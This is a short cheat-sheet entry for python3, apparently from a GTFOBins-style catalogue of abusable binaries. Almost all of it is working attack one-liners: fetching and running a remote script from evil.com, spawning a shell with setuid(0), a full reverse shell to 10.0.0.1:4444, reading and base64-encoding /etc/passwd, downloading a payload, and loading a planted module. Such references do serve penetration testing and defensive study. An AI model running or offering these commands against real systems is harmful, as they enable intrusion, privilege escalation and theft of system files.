---
title: python3
tags: [execution, shell, reverse-shell, file-read, file-write, library-load]
description: Python interpreter that can execute arbitrary code, spawn shells, and manipulate files.
exec: |
  # Execute arbitrary Python code
  python3 -c "import os; os.system('/bin/bash')"
  
  # Execute remote Python script
  python3 -c "import urllib.request; exec(urllib.request.urlopen('https://evil.com/script.py').read())"
shell: |
  # Spawn interactive shell
  python3 -c "import pty; pty.spawn('/bin/bash')"
  
  # Spawn shell with specific user
  python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
reverse-shell: |
  # Basic reverse shell
  python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.1',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
file-read: |
  # Read file contents
  python3 -c "print(open('/etc/passwd').read())"
  
  # Read and base64 encode
  python3 -c "import base64; print(base64.b64encode(open('/etc/passwd','rb').read()).decode())"
file-write: |
  # Write to file
  python3 -c "open('/tmp/test','w').write('malicious content')"
  
  # Download and write file
  python3 -c "import urllib.request; urllib.request.urlretrieve('https://evil.com/payload', '/tmp/payload')"
library-load: |
  # Load arbitrary Python modules
  python3 -c "import sys; sys.path.insert(0, '/tmp'); import malicious_module"
layout: binary
---
